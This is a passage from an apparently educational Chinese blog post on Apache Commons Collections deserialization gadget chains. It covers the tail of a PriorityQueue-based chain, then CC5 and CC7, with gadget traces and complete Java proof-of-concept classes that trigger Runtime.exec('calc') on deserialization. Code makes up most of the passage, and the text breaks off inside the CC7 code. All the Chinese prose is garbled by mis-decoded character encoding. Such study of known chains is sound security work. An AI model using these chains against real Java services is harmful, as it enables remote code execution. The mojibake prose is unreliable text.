class_">ChainedTransformer</span>(fakeTransformers);<br><br>        <span class="hljs-type">Comparator</span> <span class="hljs-variable">comparator</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformingComparator</span>(transformerChain);<br>        <span class="hljs-comment">//ç¬¬ä¸€ä¸ªå‚æ•°æ˜¯åˆå§‹åŒ–æ—¶çš„å¤§å°ï¼Œè‡³å°‘éœ€è¦2ä¸ªå…ƒç´ æ‰ä¼šè§¦å‘æ’åºå’Œæ¯”è¾ƒ</span><br>        <span class="hljs-comment">//ç¬¬äºŒä¸ªå‚æ•°æ˜¯æ¯”è¾ƒæ—¶çš„Comparatorï¼Œä¼ å…¥å‰é¢å®ä¾‹åŒ–çš„comparator</span><br>        <span class="hljs-type">PriorityQueue</span> <span class="hljs-variable">queue</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">PriorityQueue</span>(<span class="hljs-number">2</span>, comparator);<br>        queue.add(<span class="hljs-number">1</span>);<br>        queue.add(<span class="hljs-number">2</span>);<br>        setFieldValue(transformerChain, <span class="hljs-string">&quot;iTransformers&quot;</span>, transformers);<br>        <span class="hljs-comment">//ç”Ÿæˆåºåˆ—åŒ–æ•°æ®</span><br>        <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">barr</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(barr);<br>        oos.writeObject(queue);<br>        oos.close();<br><br>        <span class="hljs-comment">//System.out.println(barr);</span><br>        <span class="hljs-comment">//ååºåˆ—åŒ–</span><br>        <span class="hljs-type">ByteArrayInputStream</span> <span class="hljs-variable">in</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayInputStream</span>(barr.toByteArray());<br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(in);<br>        ois.readObject();<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setFieldValue</span><span class="hljs-params">(Object obj, String fieldName, Object value)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> obj.getClass().getDeclaredField(fieldName);<br>        field.setAccessible(<span class="hljs-literal">true</span>);<br>        field.set(obj, value);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="/2024/07/28/Commons-Collections/image-20240728230441860.png" alt="image-20240728230441860"></p><p>ä¸è¿‡è¿™æ¡åˆ©ç”¨é“¾åœ¨<code>commons-collections3</code>æ˜¯æ— æ³•ä¸­åˆ©ç”¨çš„ã€‚</p><p>å› ä¸º<code>org.apache.commons.collections4.comparators.TransformingComparator</code>åœ¨<code>commons-collections4.0</code>ä¹‹å‰æ²¡æœ‰å®ç°<code>Serializable</code>æ¥å£ï¼Œæ— æ³•åºåˆ—åŒ–ã€‚</p><h2 id="CC5"><a href="#CC5" class="headerlink" title="CC5"></a>CC5</h2><p>è¿™ä¸ªé“¾ä¸»è¦æ˜¯ä¸ºäº†è§£å†³é«˜ç‰ˆæœ¬åˆ©ç”¨é—®é¢˜ï¼Œä½¿ç”¨<code>BadAttributeValueExpException</code>æ›¿æ¢<code>AnnotationInvocationHandler</code>é…åˆ<code>TiedMapEntry#toString()</code>å»ä¸²è”<code>LazyMap#get()</code>è°ƒç”¨<code>transform()</code>è§¦å‘<code>ChainedTransformer</code>æ¶æ„å¯¹è±¡åå°„é“¾ã€‚</p><p>ä¹Ÿå°±æ˜¯æˆ‘ä»¬å‰é¢CC1è°ˆåˆ°çš„ï¼š</p><p>åœ¨8u71ä»¥åJavaå®˜æ–¹ä¿®æ”¹äº†<code>sun.reflect.annotation.AnnotationInvocationHandler</code>çš„<code>readObject</code>å‡½æ•°ï¼š<a href="http://hg.openjdk.java.net/jdk8u/jdk8u/jdk/rev/f8a528d0379d">http://hg.openjdk.java.net/jdk8u/jdk8u/jdk/rev/f8a528d0379d</a></p><p>æ”¹åŠ¨åï¼Œä¸å†ç›´æ¥ä½¿ç”¨ååºåˆ—åŒ–å¾—åˆ°çš„Mapå¯¹è±¡ï¼Œè€Œæ˜¯æ–°å»ºäº†ä¸€ä¸ª<code>LinkedHashMap</code>å¯¹è±¡ï¼Œå¹¶å°†åŸæ¥çš„é”®å€¼æ·»åŠ è¿›å»ï¼Œä¼ è¿›å»çš„æ¶æ„Mapä¸å†æ‰§è¡Œsetæˆ–putæ“ä½œï¼Œä¾¿æ— æ³•è§¦å‘<code>transform</code>ã€‚</p><h3 id="POC-5"><a href="#POC-5" class="headerlink" title="POC"></a>POC</h3><p>å…ˆç»™å‡ºGadget Chainsï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs java">ObjectInputStream#readObject()<br>    BadAttributeValueExpException#readObject()<br>    TiedMapEntry#toString()<br>    LazyMap#get()<br>                       <span class="hljs-comment">//æ¶æ„å¯¹è±¡åå°„é“¾éƒ¨åˆ†</span><br>    ChainedTransformer.transform()<br>                            ConstantTransformer#transform()<br>                            InvokerTransformer#transform()<br>                            Method#invoke()<br>                            Class#getMethod()<br>                            InvokerTransformer#transform()<br>                            Method#invoke()<br>                            Runtime#getRuntime()<br>                            InvokerTransformer#transform()<br>                            Method#invoke()<br>                            Runtime#exec()<br></code></pre></td></tr></table></figure><p>å€Ÿç”¨å­¦é•¿çš„æ”¹æ”¹ï¼ŒåŒæ—¶æŠŠserializeå’Œdeserializeå†™è¿›å‡½æ•°é‡Œï¼Œç®—æ˜¯æ¢ä¸€ç§ä»£ç é£æ ¼ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.eddiemurphy;<br><br><span class="hljs-keyword">import</span> org.apache.commons.collections.Transformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.*;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.LazyMap;<br><br><span class="hljs-keyword">import</span> javax.management.BadAttributeValueExpException;<br><span class="hljs-keyword">import</span> java.io.ByteArrayInputStream;<br><span class="hljs-keyword">import</span> java.io.ByteArrayOutputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectInputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectOutputStream;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Map;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CC5</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        ChainedTransformer chain=getChainedTransformer();<br>        Map lazymap=LazyMap.decorate(<span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>(),chain);<br>        TiedMapEntry tiedMapEntry=<span class="hljs-keyword">new</span> <span class="hljs-title class_">TiedMapEntry</span>(lazymap,<span class="hljs-number">1</span>);<br>        BadAttributeValueExpException e=<span class="hljs-keyword">new</span> <span class="hljs-title class_">BadAttributeValueExpException</span>(<span class="hljs-literal">null</span>);<br>        setFieldValue(e,<span class="hljs-string">&quot;val&quot;</span>,tiedMapEntry);<br>        deserialize(serialize(e));<br>    &#125;<br>    <span class="hljs-keyword">static</span> ChainedTransformer <span class="hljs-title function_">getChainedTransformer</span><span class="hljs-params">()</span>&#123;<br>        ConstantTransformer ct=<span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(Runtime.class);<br><br>        InvokerTransformer it1=<span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<br>                <span class="hljs-string">&quot;getMethod&quot;</span>,<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class, Class[].class&#125;,<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;getRuntime&quot;</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[<span class="hljs-number">0</span>]&#125;<br>        );<br>        InvokerTransformer it2=<span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<br>                <span class="hljs-string">&quot;invoke&quot;</span>,<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Object.class,Object[].class&#125;,<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;getRuntime&quot;</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[<span class="hljs-number">0</span>]&#125;<br>        );<br>        InvokerTransformer it_exec=<span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<br>                <span class="hljs-string">&quot;exec&quot;</span>,<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;,<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;<br>        );<br>        Transformer[] a=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]&#123;ct,it1,it2,it_exec&#125;;<br>        ChainedTransformer chain=<span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(a);<br>        <span class="hljs-keyword">return</span> chain;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setFieldValue</span><span class="hljs-params">(Object obj, String fieldName, Object newValue)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">Class</span> <span class="hljs-variable">clazz</span> <span class="hljs-operator">=</span> obj.getClass();<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> clazz.getDeclaredField(fieldName);<br>        field.setAccessible(<span class="hljs-literal">true</span>);<br>        field.set(obj, newValue);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-type">byte</span>[] serialize(Object obj) <span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">baos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(baos);<br>        oos.writeObject(obj);<br>        oos.close();<br>        <span class="hljs-keyword">return</span> baos.toByteArray();<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">deserialize</span><span class="hljs-params">(<span class="hljs-type">byte</span>[] bytes)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayInputStream</span>(bytes)).readObject();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="/2024/07/28/Commons-Collections/image-20240728231404160.png" alt="image-20240728231404160"></p><h2 id="CC7"><a href="#CC7" class="headerlink" title="CC7"></a>CC7</h2><p>CC7å‹è½´ã€‚</p><p>å› ä¸ºå®ƒçœŸçš„å¾ˆç»•ã€‚æ‰“çš„è¿˜æ˜¯<code>CommonsCollections 3.1 - 3.2.1</code></p><p>æ¢äº†<code>Hashtable</code>ç±»ï¼Œåˆ©ç”¨å…¶<code>reconstitutionPut</code>æ–¹æ³•ä¸­æ¯”è¾ƒkeyçš„å€¼ï¼Œä¼šè°ƒç”¨LazyMapçš„equalsæ–¹æ³•ã€‚</p><h3 id="ä¸ºä»€ä¹ˆè¦putä¸¤ä¸ªlazymap"><a href="#ä¸ºä»€ä¹ˆè¦putä¸¤ä¸ªlazymap" class="headerlink" title="ä¸ºä»€ä¹ˆè¦putä¸¤ä¸ªlazymap"></a>ä¸ºä»€ä¹ˆè¦putä¸¤ä¸ªlazymap</h3><p>å› ä¸ºä¸ºäº†è¿›<code>reconstitutionPut</code> <code>for</code>å¾ªç¯ï¼Œ<code>tab</code>éœ€è¦ä¸ä¸ºç©ºã€‚</p><p><code>tab</code>å…¶å®å°±æ˜¯<code>hashtable</code>ï¼Œ<code>entry</code>æ˜¯å•é“¾ï¼ŒåŠ¨è°ƒèƒ½å‘ç°<code>put</code>ä¸¤ä¸ªçš„æ—¶å€™èƒ½è®©<code>tab</code>ä¸ä¸ºç©º</p><img src="/2024/07/28/Commons-Collections/image-20240728232740736.png" class="" title="image-20240728232740736"><h3 id="å“ˆå¸Œç¢°æ’"><a href="#å“ˆå¸Œç¢°æ’" class="headerlink" title="å“ˆå¸Œç¢°æ’"></a>å“ˆå¸Œç¢°æ’</h3><p><code>if</code>è¿™ä¸€è¡Œç”±äºç”¨ <code>&amp;&amp;</code> è¿æ¥ï¼Œå·¦è¾¹ä¸º<code>false</code>å°±ä¸ä¼šæ‰§è¡Œå³è¾¹ã€‚</p><p>è¿™ä¸¤ä¸ª<code>hash</code>å¯¹åº”å½“å‰<code>key</code>å’Œä¸Šä¸€ä¸ª<code>key</code>çš„<code>hashcode</code>ï¼š</p><img src="/2024/07/28/Commons-Collections/image-20240728233018118.png" class="" title="image-20240728233018118"><p>è¿™é‡Œkeyæˆ‘ä»¬é€‰æ‹©çš„æ˜¯Stringï¼Œè§‚å¯Ÿ<code>String.hashCode()</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">hashCode</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-type">int</span> <span class="hljs-variable">h</span> <span class="hljs-operator">=</span> hash;<br>    <span class="hljs-keyword">if</span> (h == <span class="hljs-number">0</span> &amp;&amp; value.length &gt; <span class="hljs-number">0</span>) &#123;<br>        <span class="hljs-type">char</span> val[] = value;<br><br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; value.length; i++) &#123;<br>            h = <span class="hljs-number">31</span> * h + val[i];<br>        &#125;<br>        hash = h;<br>    &#125;<br>    <span class="hljs-keyword">return</span> h;<br>&#125;<br></code></pre></td></tr></table></figure><p>çˆ†ç ´ä¸¤ä½å°±å¯:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.eddiemurphy;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">HashCollision</span> &#123;<br>    <span class="hljs-keyword">static</span> String dict=<span class="hljs-string">&quot;0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!\&quot;#$%&amp;\&#x27;()*+,-./:;&lt;=&gt;?@[\\]^_`&#123;|&#125;~ \t\n\r&quot;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-type">int</span> len=dict.length();<br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> a1=<span class="hljs-number">0</span>;a1&lt;len;a1++)&#123;<br>            <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> a2=<span class="hljs-number">0</span>;a2&lt;len;a2++)&#123;<br>                <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> b1=<span class="hljs-number">0</span>;b1&lt;len;b1++)&#123;<br>                    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> b2=<span class="hljs-number">0</span>;b2&lt;len;b2++)&#123;<br>                        <span class="hljs-keyword">if</span>(a1!=b1&amp;&amp;a2!=b2)&#123;<br>                            String s1=get(a1)+get(a2);<br>                            String s2=get(b1)+get(b2);<br>                            <span class="hljs-keyword">if</span>(s1.hashCode()==s2.hashCode())&#123;<br>                                System.out.println(s1+<span class="hljs-string">&quot;\n&quot;</span>+s2);<br>                                <span class="hljs-keyword">return</span>;<br>                            &#125;<br>                        &#125;<br>                    &#125;<br>                &#125;<br>            &#125;<br>        &#125;<br>        System.out.println(<span class="hljs-string">&quot;fuck&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">static</span> String <span class="hljs-title function_">get</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>&#123;<br>        <span class="hljs-keyword">return</span>  String.valueOf(dict.charAt(i));<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="ä¸ºä»€ä¹ˆmap2-remove-00"><a href="#ä¸ºä»€ä¹ˆmap2-remove-00" class="headerlink" title="ä¸ºä»€ä¹ˆmap2.remove(&quot;00&quot;);"></a>ä¸ºä»€ä¹ˆ<code>map2.remove(&quot;00&quot;);</code></h3><p>å…¶å®å’Œä¸Šé¢çš„CommonsCollections6ä¸€æ ·é“ç†ï¼Œ<code>hashtable.put(map2, 1);</code>è¿™ä¸€è¡Œä¹Ÿä¼šè°ƒç”¨<code>lazymap.get</code>ï¼Œä»è€Œå¤šåŠ äº†ä¸€ä¸ªå¸¦ç€<code>processImpl</code>çš„å…ƒç´ ï¼Œä¸èƒ½åºåˆ—åŒ–ã€‚</p><p><img src="/2024/07/28/Commons-Collections/image-20240728233236250.png" alt="image-20240728233236250"></p><h3 id="POC-6"><a href="#POC-6" class="headerlink" title="POC"></a>POC</h3><p>å…ˆç»™å‡ºGadget Chainsï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs java">Hashtable#readObject()<br>    Hashtable#reconstitutionPut()<br>AbstractMapDecorator#equals()<br>    AbstractMap#equals()<br>    LazyMap#get()<br>                                <span class="hljs-comment">//æ¶æ„å¯¹è±¡åå°„é“¾éƒ¨åˆ†</span><br>    ChainedTransformer#transform()<br>                            ConstantTransformer#transform()<br>                            InvokerTransformer#transform()<br>                            Method#invoke()<br>                            Class#getMethod()<br>                            InvokerTransformer#transform()<br>                            Method#invoke()<br>                            Runtime#getRuntime()<br>                            InvokerTransformer#transform()<br>                            Method#invoke()<br>                            Runtime#exec()<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.eddiemurphy;<br><br><span class="hljs-keyword">import</span> org.apache.commons.collections.Transformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.LazyMap;<br><br><span class="hljs-keyword">import</span> java.io.ByteArrayInputStream;<br><span class="hljs-keyword">import</span> java.io.ByteArrayOutputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectInputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectOutputStream;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Hashtable;<br><span class="hljs-keyword">import</span> java.util.Map;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CC7</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-type">ChainedTransformer</span> <span class="hljs-variable">chain</span> <span class="hljs-operator">=</span> getChainedTransformer();<br><br>            Map&lt;String, Integer&gt; hashMap1 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>            Map&lt;String, Integer&gt; hashMap2 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br><br>            Map&lt;String, Integer&gt; map1 = LazyMap.decorate(hashMap1, chain);<br>            map1.put(<span class="hljs-string">&quot;00&quot;</span>, <span class="hljs-number">1</span>);<br>            Map&lt;String, Integer&gt; map2 = LazyMap.decorate(hashMap2, chain);<br>            map2.put(<span class="hljs-string">&quot;.n&quot;</span>, <span class="hljs-number">1</span>);<br>            Hashtable&lt;Map&lt;String, Integer&gt;, Integer&gt; hashtable = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Hashtable</span>&lt;&gt;();<br>            hashtable.put(map1, <span class="hljs-number">1</span>);<br>            hashtable.put(map2, <span class="hljs-number">1</span>);<br>            map2.remove(<span class="hljs-string">&quot;00&quot;</span>);<br>            deserialize(serialize(hashtable));<br>        &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>            e.printStackTrace();<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">static</span> ChainedTransformer <span class="hljs-title function_">getChainedTransformer</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-type">ConstantTransformer</span> <span class="hljs-variable">ct</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(Runtime.class);<br><br>        <span class="hljs-type">InvokerTransformer</span> <span class="hljs-variable">it1</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<br>                <span class="hljs-string">&quot;getMethod&quot;</span>,<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class, Class[].class&#125;,<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;getRuntime&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[<span class="hljs-number">0</span>]&#125;<br>        );<br>        <span class="hljs-type">InvokerTransformer</span> <span class="hljs-variable">it2</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<br>                <span class="hljs-string">&quot;invoke&quot;</span>,<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Object.class, Object[].class&#125;,<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-literal">null</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[<span class="hljs-number">0</span>]&#125;<br>        );<br>        <span class="hljs-type">InvokerTransformer</span> <span class="hljs-variable">it_exec</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<br>                <span class="hljs-string">&quot;exec&quot;</span>,<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;,<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;<br>        );<br>        Transformer[] a = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]&#123;ct, it1, it2, it_exec&#125;;<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(a);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-type">byte</span>[] serialize(Object obj) <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-keyword">try</span> (<span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">baos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>             <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(baos)) &#123;<br>            oos.writeObject(obj);<br>            <span class="hljs-keyword">return</span> baos.toByteArray();<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">deserialize</span><span class="hljs-params">(<span class="hljs-type">byte</span>[] bytes)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-keyword">try</span> (<span class="hljs-type">ObjectInputStream</span> <span 